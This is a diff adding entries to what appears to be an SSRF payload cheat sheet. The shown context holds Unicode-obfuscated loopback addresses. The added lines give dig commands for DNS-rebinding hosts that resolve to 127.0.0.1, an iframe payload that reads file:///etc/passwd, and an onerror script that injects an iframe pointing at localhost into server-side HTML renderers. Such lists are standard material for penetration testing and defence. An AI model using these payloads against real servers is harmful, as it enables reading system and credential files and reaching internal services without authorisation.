@@ -117,4 +117,22 @@ Dotted octal IP with padding
 𝟘𝟘①𝟕⑦．１
 ⓪𝟘𝟙𝟳𝟽｡𝟎𝓧₀｡𝟏
 ```
+## DNS Pining [1u.ms](http://1u.ms/)
 
+Single record
+```
+dig A make-127-0-0-1-rr.1u.ms
+```
+
+Multiple record
+
+```
+dig A make-127-0-0-1-and-127-127-127-127-rr.1u.ms
+```
+
+## Server-side processing of arbitrary HTML and JS
+
+```
+<iframe src="file:///etc/passwd" width="400" height="400">
+<img src onerror="document.write('<iframe src=//127.0.0.1></iframe>')">
+```
